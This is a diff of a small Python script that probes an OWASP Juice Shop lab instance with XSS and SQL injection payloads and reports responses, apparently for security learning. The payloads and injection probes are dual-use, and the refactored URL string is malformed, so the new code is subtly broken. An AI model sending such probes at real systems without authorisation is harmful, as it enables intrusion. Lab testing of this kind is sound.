@@ -1,56 +1,34 @@
 import requests
 import urllib
 
-def send_request():
-    # endpoint = input("endpoint: ")
-    # endpoint = "/rest/user/login"
-    # endpoint = "/track-result?id="
+JUICE_SHOP_URL = "http://192.168.1.119:3000"
 
-    endpoint = "/rest/products/search?q="
-    print(endpoint)
-    # command = input("command (GET or POST): ").strip().upper()
-    command = "GET"
+def send_request(endpoint, command, payload, headers = None):
+    url = f"JUICE_SHOP_URL{endpoint}"
 
-    # payload = input("body (JSON) or payload: ").strip()
-    # payload = "{\"email\": \"<iframe src=javascript:alert(1)>\", \"password\": \"any_password\"}"
-    # payload = "<script>alert(1)</script>"
-    payload = "';"
-    payload_encoded = urllib.parse.quote(payload)
-
-
-
-    url = f"http://192.168.1.119:3000{endpoint}"
-    print(url)
+    payload = urllib.parse.quote(payload)
 
     if "POST" == command:
         headers = {"Content-Type": "application/json"}
         response = requests.post(url, data=payload, headers=headers)
-    else:
-        response = requests.get(url + payload_encoded)
+    elif "GET" == command:
+        response = requests.get(url + payload)
 
-    print(f"status: {response.status_code} \t reason: {response.reason}")
-    response_body = response.text
-    # print(f"body: {response_body}")
+    return response
 
-    with open("response_payload.html", "w", encoding="utf-8") as f:
-        f.write(response_body)
+def scan_endpoints():
+    endpoints = [
+        {"endpoint": "/rest/user/login", "command": "POST", "payload": "{\"email\": \"<iframe src=javascript:alert(1)>\", \"password\": \"any_password\"}"},
+        {"endpoint": "/track-result?id=", "command": "GET", "payload": "';"},
+        {"endpoint": "/rest/products/search?q=", "command": "GET", "payload": "';"}
+    ]
 
-    if ";&lt;script&gt" in response_body or "<script>" in response_body:
-        print("SUCCESS: Reflected XSS vulnerability found!")
-
-    if "SQLITE_ERROR" in response_body:
-        print("SUCCESS: SQL injection vulnerability found")
-
-    response_headers = response.headers
-    if "Content-Security-Policy" not in response_headers:
-        print(f"Low Severity: Missing CSP header")
-    if "Strict-Transport-Security" not in response_headers:
-        print(f"Low Severity: Missing HSTS header")
-    if "X-Content-Type-Options" not in response_headers:
-        print(f"Low Severity: Missing Content Type Options header")
-
-
-
+    print(f"{'Endpoint':<30} | {'HTTP Method':<15} | {'Payload':<80} | {'Status Code':<15} | {'Response Length':<15}")
+    print("-" * 170)
+    
+    for endpoint in endpoints:
+        response = send_request(endpoint["endpoint"], endpoint["command"], endpoint["payload"])
+        print(f"{endpoint['endpoint']:<30} | {endpoint['command']:<15} | {endpoint['payload']:<80} | {response.status_code:<15} | {len(response.text):<15}")
 
 if __name__ == '__main__':
-    send_request()
+    scan_endpoints()
